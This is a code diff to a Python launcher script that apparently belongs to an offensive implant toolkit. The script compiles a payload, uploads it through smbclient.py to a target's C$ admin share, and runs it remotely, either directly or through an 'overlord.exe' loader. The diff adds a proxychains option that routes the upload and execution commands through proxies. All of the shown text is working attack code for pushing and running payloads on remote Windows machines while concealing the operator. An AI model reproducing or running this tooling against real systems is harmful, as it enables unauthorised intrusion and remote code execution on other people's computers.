@@ -23,6 +23,7 @@ parser.add_argument('--info',default=False,action='store_true',help='activate th
 parser.add_argument('--verbose','-v',default=False,action='store_true',help='verbose execution')
 parser.add_argument('--no_loader',default=False,action='store_true',help='dont add this compil flag: --features loader')
 parser.add_argument('--dll',default=False,action='store_true',help='compile to dll')
+parser.add_argument('--proxychains',default=False,action='store_true',help='add proxychains in front of commands exec+upload command')
 
 args = parser.parse_args()
 
@@ -59,6 +60,10 @@ def main():
     if args.info:
         log_level=f'{log_level} --features info'
 
+    if args.proxychains:
+        proxychains='proxychains '
+    else:
+        proxychains=''
 
     if args.exec_target == '':
         #TODO if file not present
@@ -160,7 +165,7 @@ NOT ACTIVATED:
         else:
             log.info(f'[+] upload file via SMB into target')
         upload_comm=f'''
-smbclient.py "{exec_target}" <<EOF
+{proxychains}smbclient.py "{exec_target}" <<EOF
 use C$
 put {file_target}
 {dll_smb}
@@ -173,12 +178,12 @@ EOF
         if not args.no_exec:
             if not args.dll :
                 log.info(f'[+] exec c:\\{filename_target} with {args.exec_method}')
-                exec_comm=f"{args.exec_method} {exec_target} c:\\\\{filename_target}"
+                exec_comm=f"{proxychains}{args.exec_method} {exec_target} c:\\\\{filename_target}"
                 log.debug(exec_comm)
                 os.system(exec_comm)
             else:
                 log.info(f'[+] exec c:\\overlord.exe to load and run Overlord entrypoint of c:\\{filename_target} with {args.exec_method}')
-                exec_comm=f"{args.exec_method} {exec_target} c:\\\\overlord.exe"
+                exec_comm=f"{proxychains}{args.exec_method} {exec_target} c:\\\\overlord.exe"
                 log.debug(exec_comm)
                 os.system(exec_comm)
 
